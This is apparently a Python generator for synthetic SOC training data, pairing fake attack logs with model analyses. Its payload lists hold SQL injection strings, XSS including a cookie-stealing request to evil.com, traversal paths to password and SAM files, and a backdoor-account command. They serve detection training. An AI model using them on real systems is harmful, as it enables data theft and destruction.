"""
Log Analysis and Digital Forensics generator.
Produces entries covering authentication log analysis, web server access logs,
firewall logs, system event logs, cloud audit logs, database audit logs, and
application error logs indicating attacks. All entries include realistic log
data with timestamps, IPs, and structured analysis output.
Target: 5000 entries.
"""

import random
from typing import List, Dict, Any
from ..templates import (
    CategoryGenerator, pick_complexity, pick_severity, format_entry,
    rand_ip, rand_domain, rand_port, rand_var_name, rand_func_name,
    rand_table_name, rand_path,
)
from ..knowledge_base import (
    CWE_DB, OWASP_TOP10, MITRE_ATTACK, APP_CONTEXTS, PRODUCTS,
    CLOUD_SERVICES, FRAMEWORKS, PROTOCOLS,
)

# ── Instruction pools ──────────────────────────────────────────────────────

AUTH_LOG_INSTRUCTIONS = [
    "Analyze the following authentication logs for signs of brute-force attacks, credential stuffing, or unauthorized access. Provide a timeline and risk assessment.",
    "Review these login attempt logs. Identify suspicious patterns, compromised accounts, and recommend immediate response actions.",
    "Examine the authentication log entries below for indicators of compromise. Determine if a brute-force or credential stuffing attack is in progress.",
    "As a SOC analyst, analyze these authentication logs. Identify anomalous login patterns and assess whether an account takeover has occurred.",
]

WEB_LOG_INSTRUCTIONS = [
    "Analyze the following web server access logs for attack patterns. Identify SQL injection, directory traversal, and other web attack signatures.",
    "Review these HTTP access logs for indicators of web application attacks. Classify each suspicious request and assess the attack's success.",
    "Examine the web server logs below for signs of reconnaissance, exploitation, and data exfiltration. Provide a threat assessment.",
    "As a security analyst, review these web access logs. Identify attack patterns, determine their OWASP classification, and recommend WAF rules.",
]

FIREWALL_LOG_INSTRUCTIONS = [
    "Analyze the following firewall logs for suspicious network activity. Identify port scanning, lateral movement, and policy violations.",
    "Review these firewall deny/allow logs for indicators of compromise. Determine if an attacker is probing the network.",
    "Examine the firewall log entries below. Identify patterns consistent with network reconnaissance, data exfiltration, or C2 communication.",
]

SYSTEM_LOG_INSTRUCTIONS = [
    "Analyze the following Windows Event Logs for indicators of compromise. Check for privilege escalation, persistence, and lateral movement.",
    "Review these system event logs for signs of malicious activity. Identify suspicious process creation, service installations, and account changes.",
    "Examine the system logs below for evidence of an ongoing attack. Map findings to MITRE ATT&CK techniques.",
]

CLOUD_LOG_INSTRUCTIONS = [
    "Analyze the following CloudTrail logs for unauthorized API calls, privilege escalation, and data access anomalies.",
    "Review these cloud audit logs for indicators of account compromise. Identify suspicious IAM changes and resource modifications.",
    "Examine the cloud activity logs below for signs of credential abuse, lateral movement, and data exfiltration in a cloud environment.",
]

DB_LOG_INSTRUCTIONS = [
    "Analyze the following database audit logs for SQL injection attempts, unauthorized data access, and privilege escalation.",
    "Review these database logs for suspicious query patterns. Identify potential data exfiltration and unauthorized schema changes.",
]

APP_LOG_INSTRUCTIONS = [
    "Analyze the following application error logs for signs of exploitation attempts. Identify stack traces, error patterns, and input validation failures that indicate attacks.",
    "Review these application logs for indicators of active exploitation. Determine the attack type and whether it was successful.",
]

ALL_INSTRUCTIONS = (
    AUTH_LOG_INSTRUCTIONS + WEB_LOG_INSTRUCTIONS + FIREWALL_LOG_INSTRUCTIONS +
    SYSTEM_LOG_INSTRUCTIONS + CLOUD_LOG_INSTRUCTIONS + DB_LOG_INSTRUCTIONS +
    APP_LOG_INSTRUCTIONS
)

# ── Log data helpers ───────────────────────────────────────────────────────

USERNAMES = [
    "admin", "administrator", "root", "jsmith", "jdoe", "alice.johnson",
    "bob.wilson", "sarah.chen", "mike.brown", "deploy_svc", "api_user",
    "backup_admin", "test", "guest", "support", "hr_admin",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101",
    "python-requests/2.28.0", "curl/7.88.1", "sqlmap/1.7",
    "Nikto/2.1.6", "Go-http-client/1.1", "Java/17.0.2",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]

HTTP_STATUSES = [200, 201, 301, 302, 400, 401, 403, 404, 500, 502, 503]

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' UNION SELECT username,password FROM users--",
    "1; DROP TABLE users--",
    "' OR 1=1#",
    "admin'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>document.location='http://evil.com/?c='+document.cookie</script>",
    "javascript:alert(document.domain)",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00.jpg",
]

WINDOWS_EVENT_IDS = {
    4624: "Successful Logon",
    4625: "Failed Logon",
    4648: "Logon Using Explicit Credentials",
    4672: "Special Privileges Assigned",
    4688: "Process Created",
    4697: "Service Installed",
    4698: "Scheduled Task Created",
    4720: "User Account Created",
    4724: "Password Reset Attempt",
    4728: "Member Added to Security Group",
    4732: "Member Added to Local Group",
    4768: "Kerberos TGT Requested",
    4769: "Kerberos Service Ticket Requested",
    4776: "NTLM Authentication",
    7045: "New Service Installed",
}

CLOUDTRAIL_ACTIONS = [
    "iam:CreateUser", "iam:AttachUserPolicy", "iam:CreateAccessKey",
    "iam:PutUserPolicy", "ec2:RunInstances", "ec2:AuthorizeSecurityGroupIngress",
    "s3:PutBucketPolicy", "s3:PutBucketAcl", "s3:GetObject",
    "sts:AssumeRole", "lambda:CreateFunction", "lambda:UpdateFunctionCode",
    "rds:ModifyDBInstance", "cloudtrail:StopLogging", "guardduty:DeleteDetector",
    "kms:DisableKey", "organizations:LeaveOrganization",
]


def _rand_timestamp(rng, base_hour=None):
    """Generate a realistic log timestamp."""
    y = 2024
    m = rng.randint(1, 12)
    d = rng.randint(1, 28)
    h = base_hour if base_hour is not None else rng.randint(0, 23)
    mi = rng.randint(0, 59)
    s = rng.randint(0, 59)
    ms = rng.randint(0, 999)
    return f"{y}-{m:02d}-{d:02d}T{h:02d}:{mi:02d}:{s:02d}.{ms:03d}Z"


def _sequential_timestamps(rng, count, base_hour=None):
    """Generate sequential timestamps over a short period."""
    y = 2024
    m = rng.randint(1, 12)
    d = rng.randint(1, 28)
    h = base_hour if base_hour is not None else rng.randint(0, 23)
    mi_start = rng.randint(0, 50)
    timestamps = []
    for i in range(count):
        mi = mi_start + (i * rng.randint(0, 2))
        s = rng.randint(0, 59)
        timestamps.append(f"{y}-{m:02d}-{d:02d}T{h:02d}:{min(mi, 59):02d}:{s:02d}Z")
    return timestamps


# ── Scenario builder helpers ───────────────────────────────────────────────

def _build_auth_log_scenario(rng, complexity, domain):
    attack_type = rng.choice(["brute_force", "credential_stuffing", "password_spray", "account_takeover"])
    attacker_ip = rand_ip(rng)
    target_users = rng.sample(USERNAMES, k=rng.randint(1, 5))
    num_entries = rng.randint(10, 25) if complexity in ("advanced", "expert") else rng.randint(6, 12)
    timestamps = _sequential_timestamps(rng, num_entries, base_hour=rng.choice([2, 3, 4, 14, 15]))

    input_text = f"## Authentication Log Entries\n\n"
    input_text += f"**Source:** {rng.choice(['sshd', 'Windows Security', 'LDAP Auth', 'Web Application'])}\n"
    input_text += f"**Time Range:** {timestamps[0]} to {timestamps[-1]}\n\n"
    input_text += f"```\n"

    failed_count = 0
    success_after_fails = False

    for i in range(num_entries):
        ts = timestamps[i]
        if attack_type == "brute_force":
            user = target_users[0]
            ip = attacker_ip
            if i < num_entries - 1:
                status = "FAILED"
                failed_count += 1
            else:
                status = rng.choice(["FAILED", "SUCCESS"])
                if status == "SUCCESS":
                    success_after_fails = True
        elif attack_type == "credential_stuffing":
            user = rng.choice(target_users)
            ip = attacker_ip
            status = rng.choice(["FAILED", "FAILED", "FAILED", "SUCCESS"])
            if status == "FAILED":
                failed_count += 1
            else:
                success_after_fails = True
        elif attack_type == "password_spray":
            user = target_users[i % len(target_users)]
            ip = attacker_ip
            status = rng.choice(["FAILED", "FAILED", "FAILED", "FAILED", "SUCCESS"])
            if status == "FAILED":
                failed_count += 1
            else:
                success_after_fails = True
        else:  # account_takeover
            user = target_users[0]
            legitimate_ip = rand_ip(rng, internal=True)
            ip = attacker_ip if i >= num_entries // 2 else legitimate_ip
            status = "SUCCESS" if i < num_entries // 2 or i == num_entries - 1 else "FAILED"
            if status == "FAILED":
                failed_count += 1
            elif ip == attacker_ip:
                success_after_fails = True

        input_text += f"{ts} AUTH {status} user={user} src={ip} method={rng.choice(['password', 'keyboard-interactive', 'publickey'])}\n"

    input_text += f"```"

    cwe = rng.choice(["CWE-307", "CWE-287"])
    cwe_info = CWE_DB.get(cwe, {"name": "Auth Failure", "severity": ["medium", "high"]})

    output = f"## Authentication Log Analysis\n\n"
    output += f"**Attack Type:** {attack_type.replace('_', ' ').title()}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**MITRE ATT&CK:** T1110 - Brute Force\n"
    output += f"**Severity:** {'CRITICAL' if success_after_fails else 'HIGH'}\n\n"

    output += f"### Timeline Analysis\n"
    output += f"- **Time Window:** {timestamps[0]} to {timestamps[-1]}\n"
    output += f"- **Source IP:** {attacker_ip}\n"
    output += f"- **Failed Attempts:** {failed_count}\n"
    output += f"- **Targeted Users:** {', '.join(target_users)}\n"
    output += f"- **Successful Login After Failures:** {'YES - ACCOUNT COMPROMISED' if success_after_fails else 'No'}\n\n"

    if attack_type == "brute_force":
        output += f"### Attack Pattern\n"
        output += f"The attacker targeted a single account (`{target_users[0]}`) with {failed_count} "
        output += f"consecutive failed login attempts from {attacker_ip}. This is a classic brute-force "
        output += f"attack attempting to guess the password through repeated attempts.\n\n"
    elif attack_type == "credential_stuffing":
        output += f"### Attack Pattern\n"
        output += f"The attacker attempted logins across {len(target_users)} different accounts from "
        output += f"the same IP. This pattern is consistent with credential stuffing, where previously "
        output += f"breached credentials are tested against the application.\n\n"
    elif attack_type == "password_spray":
        output += f"### Attack Pattern\n"
        output += f"The attacker cycled through {len(target_users)} user accounts with what appears "
        output += f"to be a small set of common passwords. Password spraying avoids account lockout "
        output += f"by trying one password across many accounts before moving to the next.\n\n"
    else:
        output += f"### Attack Pattern\n"
        output += f"The logs show legitimate logins for `{target_users[0]}` from an internal IP "
        output += f"followed by suspicious login activity from an external IP ({attacker_ip}). "
        output += f"This indicates the account credentials were compromised and used by an external attacker.\n\n"

    output += f"### IOCs Extracted\n"
    output += f"- **Source IP:** {attacker_ip}\n"
    output += f"- **Targeted Accounts:** {', '.join(target_users)}\n"
    output += f"- **Time of Attack:** {timestamps[0]}\n\n"

    output += f"### Recommended Actions\n"
    if success_after_fails:
        output += f"1. **URGENT:** Force password reset for `{target_users[0] if attack_type != 'credential_stuffing' else ', '.join(target_users)}`.\n"
        output += f"2. **Investigate** all actions taken by the compromised account after the successful login.\n"
        output += f"3. **Revoke** all active sessions for affected accounts.\n"
    output += f"{'4' if success_after_fails else '1'}. **Block** source IP {attacker_ip} at the firewall.\n"
    output += f"{'5' if success_after_fails else '2'}. **Enable** account lockout after 5 failed attempts.\n"
    output += f"{'6' if success_after_fails else '3'}. **Enforce** MFA for all user accounts.\n"
    output += f"{'7' if success_after_fails else '4'}. **Deploy** CAPTCHA or progressive delays on login forms.\n"
    output += f"{'8' if success_after_fails else '5'}. **Monitor** for further attempts from the same IP range.\n"

    return cwe, input_text, output, f"Auth Attack: {attack_type.replace('_', ' ').title()} from {attacker_ip}"


def _build_web_log_scenario(rng, complexity, domain):
    attack_type = rng.choice(["sqli", "traversal", "xss", "reconnaissance", "mixed"])
    attacker_ip = rand_ip(rng)
    num_entries = rng.randint(8, 20) if complexity in ("advanced", "expert") else rng.randint(5, 10)
    timestamps = _sequential_timestamps(rng, num_entries)

    input_text = f"## Web Server Access Logs\n\n"
    input_text += f"**Server:** {domain}\n"
    input_text += f"**Log Format:** Combined (Apache/Nginx)\n\n"
    input_text += f"```\n"

    attack_entries = []
    for i in range(num_entries):
        ts = timestamps[i]
        ip = attacker_ip if rng.random() < 0.7 else rand_ip(rng)
        method = rng.choice(HTTP_METHODS[:4])
        ua = rng.choice(USER_AGENTS)
        size = rng.randint(0, 50000)

        if ip == attacker_ip:
            if attack_type == "sqli" or (attack_type == "mixed" and rng.random() < 0.4):
                payload = rng.choice(SQLI_PAYLOADS)
                path = f"/api/users?id={payload}"
                status = rng.choice([200, 500, 403])
                attack_entries.append(("SQL Injection", path, status))
            elif attack_type == "traversal" or (attack_type == "mixed" and rng.random() < 0.5):
                payload = rng.choice(TRAVERSAL_PAYLOADS)
                path = f"/files/{payload}"
                status = rng.choice([200, 400, 403, 404])
                attack_entries.append(("Path Traversal", path, status))
            elif attack_type == "xss" or (attack_type == "mixed" and rng.random() < 0.6):
                payload = rng.choice(XSS_PAYLOADS)
                path = f"/search?q={payload}"
                status = rng.choice([200, 400])
                attack_entries.append(("XSS", path, status))
            else:
                path = rng.choice([
                    "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/actuator/env",
                    "/server-status", "/.git/config", "/api/swagger.json",
                    "/backup.zip", "/robots.txt", "/sitemap.xml",
                ])
                status = rng.choice([200, 301, 403, 404])
                attack_entries.append(("Reconnaissance", path, status))
        else:
            path = rng.choice(["/", "/index.html", "/api/health", "/login", "/dashboard"])
            status = 200

        # Format as combined log
        ts_formatted = ts.replace('T', ' ').replace('Z', '')
        input_text += f"{ip} - - [{ts_formatted}] \"{method} {path} HTTP/1.1\" {status} {size} \"-\" \"{ua}\"\n"

    input_text += f"```"

    cwe_map = {
        "sqli": "CWE-89", "traversal": "CWE-22", "xss": "CWE-79",
        "reconnaissance": "CWE-200", "mixed": "CWE-89",
    }
    cwe = cwe_map.get(attack_type, "CWE-89")
    cwe_info = CWE_DB.get(cwe, {"name": "Web Attack", "severity": ["high"]})

    output = f"## Web Access Log Analysis\n\n"
    output += f"**Server:** {domain}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**Severity:** {'CRITICAL' if any(e[2] == 200 for e in attack_entries) else 'HIGH'}\n\n"

    output += f"### Attack Summary\n"
    output += f"- **Attacker IP:** {attacker_ip}\n"
    output += f"- **Time Window:** {timestamps[0]} to {timestamps[-1]}\n"
    output += f"- **Total Malicious Requests:** {len(attack_entries)}\n"
    output += f"- **Attack Types Detected:**\n"

    by_type = {}
    for atype, path, status in attack_entries:
        by_type.setdefault(atype, []).append((path, status))

    for atype, entries in by_type.items():
        successful = sum(1 for _, s in entries if s == 200)
        output += f"  - **{atype}**: {len(entries)} requests ({successful} potentially successful)\n"
    output += f"\n"

    output += f"### Detailed Findings\n\n"
    finding = 1
    for atype, entries in by_type.items():
        output += f"**{finding}. {atype} Attempts**\n"
        if atype == "SQL Injection":
            output += f"Detected {len(entries)} SQL injection attempts targeting query parameters. "
            output += f"The payloads include UNION-based extraction, boolean-based blind, and "
            output += f"time-based techniques.\n"
            output += f"- Sample payload: `{entries[0][0][:80]}...`\n"
            output += f"- HTTP response codes: {', '.join(str(e[1]) for e in entries[:5])}\n"
            if any(s == 200 for _, s in entries):
                output += f"- **WARNING:** HTTP 200 responses suggest the injection may have succeeded.\n"
        elif atype == "Path Traversal":
            output += f"Detected {len(entries)} path traversal attempts targeting file access. "
            output += f"The attacker attempted to access system files such as `/etc/passwd`.\n"
        elif atype == "XSS":
            output += f"Detected {len(entries)} cross-site scripting attempts in search/input parameters. "
            output += f"Payloads include script injection and event handler abuse.\n"
        elif atype == "Reconnaissance":
            output += f"Detected {len(entries)} reconnaissance requests probing for admin panels, "
            output += f"configuration files, and sensitive endpoints.\n"
        output += f"\n"
        finding += 1

    output += f"### IOCs\n"
    output += f"- **Source IP:** {attacker_ip}\n"
    ua_suspicious = [ua for ua in USER_AGENTS if any(t in ua for t in ["sqlmap", "Nikto", "curl"])]
    if ua_suspicious:
        output += f"- **Suspicious User-Agent:** `{ua_suspicious[0]}`\n"
    output += f"- **Attack Signatures:** {', '.join(by_type.keys())}\n\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Block** {attacker_ip} immediately at WAF/firewall.\n"
    output += f"2. **Review** application logs for successful exploitation (200 responses to attack payloads).\n"
    output += f"3. **Deploy WAF rules** to block the identified attack patterns.\n"
    output += f"4. **Verify** input validation and parameterized queries in the application code.\n"
    output += f"5. **Scan** for data breach if any SQL injection returned 200 status.\n"
    output += f"6. **Update** IDS/IPS signatures with the identified payload patterns.\n"

    return cwe, input_text, output, f"Web Attack: {attack_type.replace('_', ' ').title()} from {attacker_ip}"


def _build_firewall_log_scenario(rng, complexity, domain):
    attack_type = rng.choice(["port_scan", "lateral_movement", "exfiltration", "c2_beaconing"])
    attacker_ip = rand_ip(rng) if attack_type != "lateral_movement" else rand_ip(rng, internal=True)
    num_entries = rng.randint(10, 25)
    timestamps = _sequential_timestamps(rng, num_entries)

    input_text = f"## Firewall Log Entries\n\n"
    input_text += f"**Firewall:** fw-{rng.choice(['edge', 'core', 'dmz'])}-01\n"
    input_text += f"**Time Range:** {timestamps[0]} to {timestamps[-1]}\n\n"
    input_text += f"```\n"

    for i in range(num_entries):
        ts = timestamps[i]
        if attack_type == "port_scan":
            src = attacker_ip
            dst = rand_ip(rng, internal=True)
            dport = rng.randint(1, 65535)
            action = rng.choice(["DENY", "DENY", "DENY", "ALLOW"])
            proto = "TCP"
        elif attack_type == "lateral_movement":
            src = attacker_ip
            dst = rand_ip(rng, internal=True)
            dport = rng.choice([445, 3389, 5985, 22, 135, 139])
            action = rng.choice(["ALLOW", "DENY", "ALLOW"])
            proto = "TCP"
        elif attack_type == "exfiltration":
            src = rand_ip(rng, internal=True)
            dst = rand_ip(rng)
            dport = rng.choice([443, 53, 8443, 4443])
            action = "ALLOW"
            proto = rng.choice(["TCP", "UDP"])
        else:  # c2
            src = rand_ip(rng, internal=True)
            dst = rand_ip(rng)
            dport = rng.choice([443, 8443, 80, 8080])
            action = "ALLOW"
            proto = "TCP"

        sport = rng.randint(49152, 65535)
        bytes_sent = rng.randint(40, 50000) if action == "ALLOW" else 0
        input_text += f"{ts} {action} {proto} src={src}:{sport} dst={dst}:{dport} bytes={bytes_sent}\n"

    input_text += f"```"

    cwe = rng.choice(["CWE-284", "CWE-200", "CWE-400"])
    cwe_info = CWE_DB.get(cwe, {"name": "Network", "severity": ["high"]})

    technique_map = {
        "port_scan": ("T1046", "Network Service Discovery"),
        "lateral_movement": ("T1021", "Remote Services"),
        "exfiltration": ("T1048", "Exfiltration Over Alternative Protocol"),
        "c2_beaconing": ("T1071", "Application Layer Protocol"),
    }
    technique_id, technique_name = technique_map.get(attack_type, ("T1046", "Discovery"))

    output = f"## Firewall Log Analysis\n\n"
    output += f"**Attack Type:** {attack_type.replace('_', ' ').title()}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**MITRE ATT&CK:** {technique_id} - {technique_name}\n"
    output += f"**Severity:** {'CRITICAL' if attack_type in ('lateral_movement', 'exfiltration') else 'HIGH'}\n\n"

    output += f"### Analysis\n\n"
    if attack_type == "port_scan":
        output += f"The firewall logs show {num_entries} connection attempts from {attacker_ip} "
        output += f"to various internal hosts across different ports. The high volume of denied "
        output += f"connections to sequential or random ports is consistent with a port scan. "
        output += f"The attacker is mapping the network to identify available services.\n\n"
        output += f"**Scan Characteristics:**\n"
        output += f"- Source: {attacker_ip} (external)\n"
        output += f"- Pattern: SYN scan across multiple ports\n"
        output += f"- Mostly DENIED by firewall rules\n\n"
    elif attack_type == "lateral_movement":
        output += f"The logs show an internal host ({attacker_ip}) attempting to connect to "
        output += f"multiple internal systems on administrative ports (SMB/445, RDP/3389, "
        output += f"WinRM/5985). This is consistent with lateral movement -- an attacker "
        output += f"who has compromised one system is attempting to spread to others.\n\n"
    elif attack_type == "exfiltration":
        output += f"The logs show an internal host establishing outbound connections to "
        output += f"external IPs on encrypted ports (443, 8443). The volume and pattern "
        output += f"suggest data exfiltration rather than normal web browsing.\n\n"
    else:
        output += f"The logs reveal a regular pattern of outbound connections from an internal "
        output += f"host to an external IP. The consistent timing interval is characteristic "
        output += f"of C2 beaconing behavior, where malware periodically checks in with its "
        output += f"command-and-control server.\n\n"

    output += f"### IOCs\n"
    output += f"- **Source IP:** {attacker_ip}\n"
    output += f"- **Attack Window:** {timestamps[0]} to {timestamps[-1]}\n"
    output += f"- **Technique:** {technique_id} ({technique_name})\n\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Block** {attacker_ip} at the perimeter firewall.\n"
    output += f"2. **Investigate** the source host for signs of compromise.\n"
    output += f"3. **Review** firewall rules for any overly permissive entries.\n"
    output += f"4. **Alert** the incident response team for further investigation.\n"
    output += f"5. **Correlate** with endpoint and authentication logs for full scope.\n"

    return cwe, input_text, output, f"Firewall Alert: {attack_type.replace('_', ' ').title()}"


def _build_windows_event_scenario(rng, complexity, domain):
    scenario = rng.choice(["privilege_escalation", "persistence", "credential_access", "lateral_movement"])
    hostname = f"SRV-{rng.choice(['DC', 'WEB', 'DB', 'APP', 'FILE'])}-{rng.randint(1,5):02d}"
    num_entries = rng.randint(6, 15)
    timestamps = _sequential_timestamps(rng, num_entries)

    relevant_events = {
        "privilege_escalation": [4672, 4688, 4648, 4624],
        "persistence": [4697, 4698, 7045, 4688],
        "credential_access": [4768, 4769, 4776, 4625],
        "lateral_movement": [4624, 4648, 4672, 4688],
    }

    event_ids = relevant_events.get(scenario, [4624, 4625])

    input_text = f"## Windows Security Event Logs\n\n"
    input_text += f"**Host:** {hostname}\n"
    input_text += f"**Log Source:** Windows Security Event Log\n\n"
    input_text += f"```\n"

    for i in range(num_entries):
        ts = timestamps[i]
        eid = rng.choice(event_ids)
        event_desc = WINDOWS_EVENT_IDS.get(eid, "Unknown Event")
        user = rng.choice(USERNAMES[:6])
        src_ip = rand_ip(rng, internal=True)

        input_text += f"{ts} EventID={eid} ({event_desc}) "
        input_text += f"User={user} Source={src_ip} "

        if eid == 4688:
            proc = rng.choice(["powershell.exe", "cmd.exe", "whoami.exe", "net.exe",
                                "mimikatz.exe", "psexec.exe", "wmic.exe", "certutil.exe"])
            input_text += f"Process={proc} "
            if proc == "powershell.exe":
                input_text += f"CommandLine=\"powershell -enc {rng.choice(['SQBFAFgA', 'JABjAGwA', 'dwBoAG8A'])}...\""
            elif proc == "net.exe":
                input_text += f"CommandLine=\"net user backdoor P@ss123 /add /domain\""
        elif eid == 4697 or eid == 7045:
            input_text += f"ServiceName=\"{rng.choice(['WindowsUpdate', 'SystemHealth', 'PrintSpooler'])}\" "
            input_text += f"ServicePath=\"C:\\Windows\\Temp\\svc_{rng.randint(100,999)}.exe\""
        elif eid == 4624:
            logon_type = rng.choice([2, 3, 10])
            input_text += f"LogonType={logon_type}"
        elif eid == 4720:
            input_text += f"NewAccount=\"backdoor_user\""

        input_text += f"\n"

    input_text += f"```"

    technique_map = {
        "privilege_escalation": ("T1068", "Exploitation for Privilege Escalation"),
        "persistence": ("T1543", "Create or Modify System Process"),
        "credential_access": ("T1003", "OS Credential Dumping"),
        "lateral_movement": ("T1021", "Remote Services"),
    }
    technique_id, technique_name = technique_map.get(scenario, ("T1078", "Valid Accounts"))

    cwe = rng.choice(["CWE-284", "CWE-269", "CWE-287"])
    cwe_info = CWE_DB.get(cwe, {"name": "Access Control", "severity": ["high"]})

    output = f"## Windows Event Log Analysis\n\n"
    output += f"**Host:** {hostname}\n"
    output += f"**Scenario:** {scenario.replace('_', ' ').title()}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**MITRE ATT&CK:** {technique_id} - {technique_name}\n"
    output += f"**Severity:** CRITICAL\n\n"

    output += f"### Timeline Reconstruction\n\n"
    output += f"The event sequence on `{hostname}` from {timestamps[0]} to {timestamps[-1]} "
    output += f"indicates a {'privilege escalation' if scenario == 'privilege_escalation' else scenario.replace('_', ' ')} attack.\n\n"

    output += f"### Key Events\n\n"
    if scenario == "privilege_escalation":
        output += f"1. **Initial logon** (Event 4624) from an internal workstation.\n"
        output += f"2. **Process creation** (Event 4688) of suspicious tools (powershell with encoded commands).\n"
        output += f"3. **Special privileges assigned** (Event 4672) indicating privilege escalation.\n"
        output += f"4. **Explicit credential use** (Event 4648) suggesting credential theft.\n\n"
    elif scenario == "persistence":
        output += f"1. **Process creation** (Event 4688) launching system utilities for reconnaissance.\n"
        output += f"2. **Service installation** (Event 4697/7045) with a binary in a temp directory.\n"
        output += f"3. **Scheduled task creation** (Event 4698) for recurring execution.\n\n"
    elif scenario == "credential_access":
        output += f"1. **Kerberos TGT requests** (Event 4768) from unusual accounts.\n"
        output += f"2. **Service ticket requests** (Event 4769) for multiple services.\n"
        output += f"3. **NTLM authentication** (Event 4776) failures indicating password guessing.\n\n"
    else:
        output += f"1. **Remote logon** (Event 4624, Type 3/10) from compromised workstation.\n"
        output += f"2. **Explicit credentials** (Event 4648) used to access other systems.\n"
        output += f"3. **Process execution** (Event 4688) of remote admin tools (psexec, wmic).\n\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Isolate** {hostname} from the network.\n"
    output += f"2. **Preserve** event logs and memory for forensic analysis.\n"
    output += f"3. **Reset** credentials for all accounts observed in the logs.\n"
    output += f"4. **Hunt** for the same indicators across all domain controllers and servers.\n"
    output += f"5. **Review** Group Policy for unauthorized changes.\n"
    output += f"6. **Deploy** enhanced monitoring (Sysmon, PowerShell logging).\n"

    return cwe, input_text, output, f"Windows Events: {scenario.replace('_', ' ').title()} on {hostname}"


def _build_cloud_log_scenario(rng, complexity, domain):
    provider = rng.choice(["aws", "azure", "gcp"])
    scenario = rng.choice(["iam_abuse", "data_exfil", "defense_evasion", "resource_hijack"])
    attacker_ip = rand_ip(rng)
    num_entries = rng.randint(6, 15)
    timestamps = _sequential_timestamps(rng, num_entries)

    if provider == "aws":
        identity = f"arn:aws:iam::123456789012:user/{rng.choice(USERNAMES[:5])}"
    elif provider == "azure":
        identity = f"{rng.choice(USERNAMES[:5])}@{domain.split('.', 1)[-1]}"
    else:
        identity = f"{rng.choice(USERNAMES[:5])}@{domain.split('.', 1)[-1]}"

    if scenario == "iam_abuse":
        actions = rng.sample([a for a in CLOUDTRAIL_ACTIONS if "iam" in a.lower() or "sts" in a.lower()], k=min(5, num_entries))
    elif scenario == "data_exfil":
        actions = rng.sample([a for a in CLOUDTRAIL_ACTIONS if "s3" in a.lower() or "rds" in a.lower()], k=min(4, num_entries))
    elif scenario == "defense_evasion":
        actions = [a for a in CLOUDTRAIL_ACTIONS if "cloudtrail" in a.lower() or "guardduty" in a.lower() or "Disable" in a]
        if not actions:
            actions = ["cloudtrail:StopLogging"]
    else:
        actions = [a for a in CLOUDTRAIL_ACTIONS if "ec2" in a.lower() or "lambda" in a.lower()]

    while len(actions) < num_entries:
        actions.append(rng.choice(CLOUDTRAIL_ACTIONS))

    input_text = f"## Cloud Audit Log Entries ({provider.upper()})\n\n"
    input_text += f"**Identity:** {identity}\n"
    input_text += f"**Source IP:** {attacker_ip}\n\n"
    input_text += f"```json\n"

    for i in range(num_entries):
        action = actions[i % len(actions)]
        ts = timestamps[i]
        status = rng.choice(["Success", "Success", "AccessDenied"])
        input_text += f"{{\"timestamp\": \"{ts}\", \"action\": \"{action}\", "
        input_text += f"\"identity\": \"{identity}\", \"sourceIP\": \"{attacker_ip}\", "
        input_text += f"\"result\": \"{status}\""
        if "s3" in action.lower():
            input_text += f", \"bucket\": \"prod-data-{rng.randint(100,999)}\""
        input_text += f"}}\n"

    input_text += f"```"

    cwe = rng.choice(["CWE-284", "CWE-269", "CWE-862"])
    cwe_info = CWE_DB.get(cwe, {"name": "Access Control", "severity": ["high"]})

    output = f"## Cloud Audit Log Analysis ({provider.upper()})\n\n"
    output += f"**Scenario:** {scenario.replace('_', ' ').title()}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**Severity:** CRITICAL\n\n"

    output += f"### Assessment\n\n"
    if scenario == "iam_abuse":
        output += f"The audit logs show the identity `{identity}` performing IAM modifications "
        output += f"from an unusual IP ({attacker_ip}). The sequence of creating users, attaching "
        output += f"policies, and generating access keys is consistent with privilege escalation "
        output += f"following credential compromise.\n\n"
    elif scenario == "data_exfil":
        output += f"The logs reveal bulk data access operations from an unusual source IP. "
        output += f"The pattern of S3 bucket policy modifications followed by data retrieval "
        output += f"suggests the attacker is exfiltrating data from cloud storage.\n\n"
    elif scenario == "defense_evasion":
        output += f"The attacker is attempting to disable security monitoring by stopping "
        output += f"CloudTrail logging and disabling GuardDuty detectors. This is a critical "
        output += f"defense evasion technique that must be addressed immediately.\n\n"
    else:
        output += f"The logs show unauthorized compute resource creation, potentially for "
        output += f"cryptomining or as staging infrastructure for further attacks.\n\n"

    output += f"### Suspicious API Calls\n"
    for action in set(actions[:5]):
        severity = "CRITICAL" if any(w in action for w in ["Stop", "Delete", "Disable"]) else "HIGH"
        output += f"- `{action}` - **{severity}**\n"
    output += f"\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Revoke** credentials for `{identity}` immediately.\n"
    output += f"2. **Rotate** all access keys associated with the account.\n"
    output += f"3. **Review** IAM changes made during the incident window.\n"
    output += f"4. **Re-enable** any disabled security services (CloudTrail, GuardDuty).\n"
    output += f"5. **Audit** all resources created or modified during the attack.\n"
    output += f"6. **Enable** MFA and enforce least-privilege IAM policies.\n"
    output += f"7. **Set up** CloudTrail integrity validation and tamper alerts.\n"

    return cwe, input_text, output, f"Cloud Attack ({provider.upper()}): {scenario.replace('_', ' ').title()}"


def _build_db_log_scenario(rng, complexity, domain):
